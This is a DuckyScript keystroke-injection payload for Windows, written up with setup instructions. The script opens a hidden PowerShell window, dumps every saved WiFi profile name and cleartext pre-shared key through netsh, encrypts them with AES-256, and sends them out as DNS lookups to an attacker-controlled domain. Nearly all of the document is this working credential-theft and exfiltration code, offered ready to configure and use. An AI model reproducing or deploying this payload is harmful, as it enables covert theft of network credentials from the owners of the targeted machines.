REM_BLOCK
# Title:         Exfiltrate WiFi names and preshared keys via AES-256 Encrypted DNS  
# Description:   Exfiltrates WiFi names and PSK using DNS where the data in transit is encrypted with AES-256 
# Author:        Keld Norman / Twitter: @keld_norman
# Props:         Google, RTFM, weeks og trial and errors
# Version:       1.0
# Category:      Encrypted WiFi Exfiltration
# Target:        Windows10+ Powershell
# Attackmodes:   HID
#-----------------------------------------------------------------------------------------------------------
# You need a server to receive and decrypt the data exfiltrated by this script
# See the README for how to set up such a server.
#-----------------------------------------------------------------------------------------------------------
# Quick Guide
#-----------------------------------------------------------------------------------------------------------

1. Alter the $KEY="xxxxxx" at the bottom of the powershell code to your own password you want to use for the encryption
2. Alter the $SUB=".i.yourdomain.com" to your own domain with the NS record pointing to "i.yourdomain.com"
3. Open a powershell terminal on your PC, paste in from $scriptblock to the end (also the two extra lines below the script block)
4. The last line called $encoded will produce an output that is the powershell code in an encoded form
4. Use the encoded powershell code in the command below ( paste it in as a replacement for the PUT-THE-ENCODED-CODE-HERE string
END_REM

DUCKY_LANG US
DELAY 2000

GUI r
DELAY 500
STRINGLN cmd.exe
DELAY 500
STRINGLN powershell.exe -windowstyle hidden -NoProfile -EncodedCommand $scriptblock={
STRINGLN  function enc{[CmdletBinding()][OutputType([string])]
STRINGLN   Param([Parameter(Mandatory=$true)][String]$K,[Parameter(Mandatory=$true)][String]$T)  
STRINGLN   $sha=New-Object System.Security.Cryptography.SHA256Managed
STRINGLN   $aes=New-Object System.Security.Cryptography.AesManaged
STRINGLN   $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
STRINGLN   $aes.Padding=[System.Security.Cryptography.PaddingMode]::Zeros
STRINGLN   $aes.BlockSize=128
STRINGLN   $aes.KeySize=256
STRINGLN   $aes.Key=$sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($K))
STRINGLN   $byt=[System.Text.Encoding]::UTF8.GetBytes($T)
STRINGLN   $cry=$aes.CreateEncryptor()
STRINGLN   $enc=$cry.TransformFinalBlock($byt,0,$byt.Length)
STRINGLN   $enc=$aes.IV+$enc
STRINGLN   $aes.Dispose()
STRINGLN   $sha.Dispose()
STRINGLN   $b64=[System.Convert]::ToBase64String($enc).ToCharArray()
STRINGLN   foreach ($hx in $b64){$hex=$hex+[System.String]::Format("{0:X}",[System.Convert]::ToUInt32($hx))}
STRINGLN   return $hex
STRINGLN  }
STRINGLN  function dns{
STRINGLN   $tik=Get-Date -UFormat "%j%H%M%S"
STRINGLN   $subchars=get-random -minimum 26 -maximum 50
STRINGLN   [regex]::split($_, "(.{$subchars})")|? {$_}|%{Resolve-DnsName -Name $(-join("T",$tik,".",$_,$SUB)) -Type A -QuickTimeout -ErrorAction SilentlyContinue -DnsOnly}
STRINGLN  start-sleep -Seconds $(get-random -minimum 1 -maximum 5)
STRINGLN }
STRINGLN function wifi {
STRINGLN  $wifinames=netsh wl sh pr|sls "\:(.+)$"|%{$name=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wl sh pr n="$name" k=clear)}|sls "Key Content\W+\:(.+)$"|%{$pass=$_.Matches.Groups[1].Value.Trim(); $_}|%{[PSCustomObject]@{A=$name;B=$pass}}|ConvertTo-Csv -NTI -Delimiter ";"|Select -Skip 1
STRINGLN   $wifinames.trim()
STRINGLN  }
STRINGLN  $KEY="EncryptDataWithThisCode"
STRINGLN  $SUB=".i.yourdomain.com"
STRINGLN  wifi|%{enc -K "$KEY" -T "$_"}|%{dns "$_"}|out-null
STRINGLN }
STRINGLN $encoded = [convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptblock))
STRINGLN $encoded